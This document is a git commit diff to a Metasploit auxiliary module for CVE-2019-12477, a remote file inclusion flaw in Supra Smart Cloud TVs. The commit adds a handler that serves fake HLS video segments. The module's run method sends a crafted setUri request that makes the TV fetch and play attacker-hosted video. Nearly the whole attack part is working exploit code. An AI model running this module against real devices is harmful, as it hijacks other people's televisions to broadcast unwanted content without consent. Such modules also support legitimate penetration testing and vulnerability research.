f3b509a1bc1aadaa40140ce3207557b176b8e4a6
William Vu <William_Vu@rapid7.com>
2019-06-25 23:08:40 -0500

    Implement on_request_uri

--- modules/auxiliary/admin/http/supra_smart_cloud_tv_rfi.rb
+++ modules/auxiliary/admin/http/supra_smart_cloud_tv_rfi.rb
@@ -27,17 +27,20 @@ class MetasploitModule < Msf::Auxiliary
       'DisclosureDate' => '2019-06-03',
       'License'        => MSF_LICENSE
     ))
+
+    deregister_options('URIPATH')
   end
 
   def run
-    start_service
+    start_service('Path' => '/')
 
+    print_status("Sending fake broadcast to #{peer}")
     res = send_request_cgi(
       'method' => 'GET',
       'uri'    => '/remote/media_control',
       'vars_get' => {
         'action' => 'setUri',
-        'uri'    => get_uri
+        'uri'    => get_uri + 'epicsax.m3u8'
       }
     )
 
@@ -49,8 +52,29 @@ class MetasploitModule < Msf::Auxiliary
     print_good('Fake video was broadcasted')
   end
 
+  # XXX: Untested! Please remove this comment if it works, RootUp
   def on_request_uri(cli, request)
-    # TODO: Make this work
-    pp request
+    dir = File.join(Msf::Config.data_directory, 'exploits', 'CVE-2019-12477')
+
+    files = {
+      '/epicsax.m3u8' => 'application/x-mpegURL',
+      '/epicsax0.ts'  => 'video/MP2T',
+      '/epicsax1.ts'  => 'video/MP2T',
+      '/epicsax2.ts'  => 'video/MP2T',
+      '/epicsax3.ts'  => 'video/MP2T',
+      '/epicsax4.ts'  => 'video/MP2T'
+    }
+
+    file = request.uri
+
+    unless files.include?(file)
+      vprint_error("Sending 404 for #{file}")
+      return send_not_found(cli)
+    end
+
+    data = File.read(File.join(dir, file))
+
+    vprint_good("Sending #{file}")
+    send_response(cli, data, 'Content-Type' => files[file])
   end
 end
